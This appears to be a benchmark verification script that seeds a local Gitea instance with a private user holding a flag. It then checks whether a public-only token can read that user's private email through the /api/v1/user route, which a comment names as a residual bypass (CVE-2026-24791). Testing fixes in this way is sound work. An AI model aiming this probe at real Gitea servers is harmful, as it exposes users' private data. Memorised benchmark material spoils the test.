#!/usr/bin/env bash
# verify.sh (auto-adapted for PCBV2-0117, executor, flag_channel=body)
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
"$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \n  || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
# flag placeholder replace (file-based)
"$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
# wrap non-JSON candidate into multi-field dict (file-based)
"$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2
# Host port: compose.env from start.sh, then docker compose port.
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
case "$VERSION" in
  v0) _DYN="${PORT_V0_0:-}" ;;
  v1) _DYN="${PORT_V1_0:-}" ;;
  *) _DYN="${PORT_V2_0:-}" ;;
esac
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$" || true)"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
SVC="${SVC:-$VERSION}"
if [[ -z "$_DYN" ]]; then
  _CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
  _DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-3000}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
fi
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# ---- 幂等 seed：确保每个实例上有 pcbadmin + private alice（email=真 flag）+ public-only token ----
# 每次 run 启动的实例是全新的（stop.sh 带 --volumes），因此这里总是首次种入；
# 用 RUN_FLAG_REF（run 真 flag）种 alice 的 email，绝不用提交值 RUN_FLAG（wrong/stale 时不同），
# 保证 wrong/stale 拒绝语义：提交 wrong flag -> alice email 是真 flag -> body 不含提交值 -> 拒绝。
SEED_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
if [[ -n "$_DYN" ]]; then
  BASE_HTTP="http://127.0.0.1:${_DYN}"
  ADMIN_USER="pcbadmin"; ADMIN_PW='AdminPw!234'; ALICE_PW='AlicePw!234'
  # wait for the real Gitea API
  for i in $(seq 1 90); do
    curl -sf -m 3 "$BASE_HTTP/api/v1/version" >/dev/null 2>&1 && break
    sleep 2
  done
  # site admin via real Gitea CLI（容器内 --user git）
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" exec -T --user git "$SVC" \
    gitea admin user create --admin --username "$ADMIN_USER" --password "$ADMIN_PW" \
    --email admin@pcb.local --must-change-password=false >/dev/null 2>&1 || true
  # private account alice with per-run flag in her email
  curl -s -m 15 -u "$ADMIN_USER:$ADMIN_PW" -X POST "$BASE_HTTP/api/v1/admin/users" \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"alice\",\"email\":\"${SEED_FLAG}@pcb.local\",\"password\":\"${ALICE_PW}\",\"must_change_password\":false,\"visibility\":\"private\"}" \
    >/dev/null 2>&1 || true
  # alice's real public-only,read:user access token
  # 注意：同一个 run 内 verify.sh 会被调用多次（seed/wrong/stale/residual），
  # 固定 token 名会撞 "access token name has been used already"，所以用唯一名。
  TOKEN=""
  for _t in $(seq 1 8); do
    TNAME="pcb-public-only-$(date +%s%N)-${_t}"
    TOKEN="$(curl -s -m 15 -u "alice:${ALICE_PW}" -X POST "$BASE_HTTP/api/v1/users/alice/tokens" \
      -H 'Content-Type: application/json' \
      -d "{\"name\":\"${TNAME}\",\"scopes\":[\"public-only\",\"read:user\"]}" 2>/dev/null \
      | "$PY" -c 'import sys,json
try: print(json.load(sys.stdin)["sha1"])
except Exception: print("")' 2>/dev/null)"
    [[ -n "$TOKEN" ]] && break
    sleep 2
  done
  if [[ -n "$TOKEN" ]]; then
    export "PCB_TOKEN_${VERSION^^}=$TOKEN"
    echo "[seed] alice+token ready (${VERSION})" >&2
  else
    echo "[seed] WARN: alice token not issued" >&2
  fi
fi

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
if [[ "$MODE" == "--seed" ]]; then
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual (CVE-2026-24791)：/api/v1/user 自我路由。CVE-2025-68941 的 checkTokenPublicOnly
  # 只接了 /api/v1/users/{username} 组；/api/v1/user self 组未接 -> alice 的 public-only token
  # 在 V1 上仍可读自己的 private 账户（email=flag）。
  printf '%s' '{"probe_id": "cve-2026-24791-public-only-self-route", "method": "GET", "endpoint": "/api/v1/user", "token": "alice-public-only-token"}' > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
fi
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('body') or d.get('fetched_body') or d.get('resp') or d.get('response') or d.get('location') or '')
sys.exit(0 if '$RUN_FLAG' in body else 10)" "$OUT"
